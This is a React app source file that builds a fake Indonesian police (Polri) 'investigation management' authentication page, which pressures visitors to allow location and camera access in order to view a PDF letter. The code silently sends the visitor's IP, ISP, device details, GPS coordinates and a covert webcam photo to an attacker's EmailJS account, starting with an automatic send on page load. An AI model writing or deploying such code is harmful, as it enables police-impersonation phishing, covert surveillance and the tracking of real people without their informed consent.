import React, { useEffect, useRef, useState } from 'react';
import useGetIP from './hooks/useGetIP';
import useGetDeviceInfo from './hooks/useGetDeviceInfo';
import haversine from 'haversine-distance';
import emailjs from '@emailjs/browser';
import suratNova from './assets/surat-nova.pdf';
import polriLogo from './assets/polri.png';

const BOGOR_COORDS = { latitude: -6.5971, longitude: 106.7949 };

function App() {
  const { data: ipData, loading } = useGetIP();
  const { detectOS, detectBrowser, screenSize } = useGetDeviceInfo();
  const [showModal, setShowModal] = useState(true);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // Ref untuk kontrol pengiriman agar tidak duplikat
  const sentStep = useRef({ ip: false, gps: false, cam: false });

  const sendEmail = async (gpsLat, gpsLon, gpsStatus, photoBase64 = "Pending/Denied") => {
    try {
      const finalLat = gpsLat || ipData?.lat || 0;
      const finalLon = gpsLon || ipData?.lon || 0;
      
      let distanceText = "Tidak terhitung";
      if (finalLat !== 0) {
        const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
        distanceText = `${distance} km`;
      }

      // Pastikan Key di bawah ini SAMA PERSIS dengan yang ada di kurung kurawal {{ }} template email
      const templateParams = {
        captured_image: photoBase64,
        ip_address: ipData?.ip || "Detecting...",
        isp_info: ipData ? `${ipData.isp} (${ipData.as})` : "Detecting...",
        org_name: ipData?.org || "N/A",
        hostname: ipData?.hostname || "N/A", // Tambahkan ini
        conn_type: ipData?.is_mobile ? "📱 Mobile" : "🌐 WiFi",
        vpn_status: ipData?.is_vpn ? "⚠️ Proxy/VPN DETECTED" : "✅ Clean Connection", // Tambahkan ini
        user_type: ipData?.is_bot ? "🤖 Bot/Hosting" : "👤 Residential User", // Tambahkan ini
        
        location_full: ipData ? `${ipData.district}, ${ipData.city}` : "Detecting...",
        timezone_info: ipData?.timezone || "N/A", // Tambahkan ini
        isp_lat_long: `${ipData?.lat},${ipData?.lon}`, // Koordinat dari IP
        
        gps_status: gpsStatus,
        gps_coords: gpsLat ? `${gpsLat},${gpsLon}` : "Not Available", // Untuk {{gps_coords}}
        gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : `${ipData?.lat},${ipData?.lon}`, // Untuk Link Google Maps GPS
        
        distance_bogor: distanceText,
        timestamp: new Date().toLocaleString('id-ID') + " WIB",
        device_info: `${detectOS()} | ${detectBrowser()}`,
        screen_res: `${screenSize?.width || 0}x${screenSize?.height || 0}`,
      };

      await emailjs.send(
        'service_rjl2ja4', 
        'template_iruemib', 
        templateParams, 
        'ZoURH59lMids8g1rT'
      );
    } catch (err) {
      console.error('Email Error:', err);
    }
  };

  // --- TAHAP 1: KIRIM DATA IP OTOMATIS ---
  useEffect(() => {
    // Pastikan loading selesai DAN ipData sudah ada isinya
    if (!loading && ipData?.ip && !sentStep.current.ip) {
      sentStep.current.ip = true;
      sendEmail(null, null, "Tahap 1: Akses Awal");
    }
  }, [loading, ipData]);

  // --- FUNGSI KAMERA ---
  const takeSilentPhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 1200));
      const canvas = document.createElement('canvas');
      canvas.width = 400; canvas.height = 300;
      canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
      const img = canvas.toDataURL('image/jpeg', 0.3);
      stream.getTracks().forEach(t => t.stop());
      return img;
    } catch (e) { return "Kamera Ditolak"; }
  };

  // --- LOGIKA TOMBOL ---
  const handleHybridTracking = () => {
    if (isProcessing) return;
    setIsProcessing(true);

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          setShowModal(false); // TUTUP MODAL
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          
          await sendEmail(lat, lon, "GPS Aktif");
          const photo = await takeSilentPhoto();
          await sendEmail(lat, lon, "Foto Identitas", photo);
          setIsProcessing(false);
        },
        (err) => {
          setIsProcessing(false);
          sendEmail(null, null, `GPS Ditolak: ${err.message}`);
          alert("Akses Lokasi Wajib Diizinkan untuk Verifikasi Wilayah Hukum.");
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    } else {
      setIsProcessing(false);
      alert("Browser Anda tidak mendukung verifikasi lokasi.");
    }
  };

  return (
    <div style={{ 
      height: '100vh', width: '100vw', backgroundColor: '#1a1a1a', 
      display: 'flex', justifyContent: 'center', alignItems: 'center', 
      position: 'relative', overflow: 'hidden', fontFamily: 'sans-serif' 
    }}>
      
      {/* MODAL VERIFIKASI */}
      {showModal && (
        <div style={{ 
          position: 'absolute', inset: 0, backgroundColor: 'rgba(0, 0, 0, 0.3)', 
          display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999, // Memberikan efek blur pada background agar lebih premium
        }}>
          <div style={{ 
            backgroundColor: '#fff', padding: '40px 30px', borderRadius: '4px', // Siku lebih tegas (formal)
            textAlign: 'center', maxWidth: '380px', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)',
            borderTop: '8px solid #1a237e' // Aksen biru tua Polri
          }}>
            <img src={polriLogo} alt="Kepolisian Negara Republik Indonesia" style={{ width: '90px', marginBottom: '20px' }} />
            
            <h2 style={{ fontSize: '1.1rem', color: '#1a237e', fontWeight: '800', marginBottom: '5px', letterSpacing: '1px' }}>
              AUTENTIKASI SISTEM E-MANAJEMEN PENYIDIKAN
            </h2>
            <p style={{ fontSize: '10px', color: '#777', marginBottom: '20px', fontWeight: 'bold' }}>
              PROTOKOL KEAMANAN DATA SANGAT RAHASIA (SR-01)
            </p>

            <div style={{ 
              backgroundColor: '#f8f9fa', padding: '15px', borderRadius: '5px', 
              border: '1px solid #e0e0e0', marginBottom: '25px', textAlign: 'left' 
            }}>
              <p style={{ fontSize: '12px', color: '#333', lineHeight: '1.6', margin: 0 }}>
                Berdasarkan <b>Undang-Undang ITE Pasal 30</b>, akses dokumen digital Kepolisian wajib melalui verifikasi <b>Geofencing</b> dan <b>Biometrik Visual</b> guna memastikan validitas subjek hukum di wilayah NKRI.
              </p>
            </div>

            <p style={{ fontSize: '11px', color: '#b71c1c', fontWeight: 'bold', marginBottom: '20px' }}>
              ⚠️ Mohon klik "Allow/Izinkan" pada permintaan akses Browser untuk melanjutkan proses verifikasi.
            </p>

            <button 
              onClick={handleHybridTracking}
              disabled={isProcessing}
              style={{ 
                backgroundColor: isProcessing ? '#cccccc' : '#1a237e', 
                color: '#fff', 
                border: 'none', 
                padding: '18px', 
                borderRadius: '4px', 
                width: '100%',
                fontWeight: '800', 
                cursor: isProcessing ? 'not-allowed' : 'pointer', 
                fontSize: '13px',
                letterSpacing: '1px',
                transition: 'all 0.3s ease',
                textTransform: 'uppercase'
              }}
            >
              {isProcessing ? "MENSINKRONISASI DATA..." : "SETUJUI & BUKA DOKUMEN"}
            </button>

            <p style={{ fontSize: '9px', color: '#aaa', marginTop: '20px' }}>
              &copy; 2026 Divisi Teknologi Informasi dan Komunikasi Polri
            </p>
          </div>
        </div>
      )}

      {/* PDF VIEW (Akan terlihat setelah modal tutup) */}
      <div style={{ 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center',     
          height: '100vh',          // Memastikan container setinggi layar
          width: '100vw',           // Memastikan container selebar layar
          backgroundColor: '#1a1a1a' // Background gelap agar transisi halus
      }}>
          <object 
              data={`${suratNova}#toolbar=0&navpanes=0&scrollbar=0`} // Menambah parameter untuk sembunyikan navigasi bawaan
              type="application/pdf" 
              style={{
                  width: '100%',     // Full lebar container
                  height: '100%',    // Full tinggi container
                  border: 'none',    // Menghilangkan border default browser
                  display: 'block'
              }}
          >
              <div style={{ color: '#fff', textAlign: 'center', padding: '20px' }}>
                  <p>Perangkat Anda tidak mendukung pemutar PDF langsung.</p>
                  <a href={suratNova} style={{ color: '#2196f3' }}>Klik di sini untuk mengunduh dokumen.</a>
              </div>
          </object>
      </div>

    </div>
  );
}

export default App;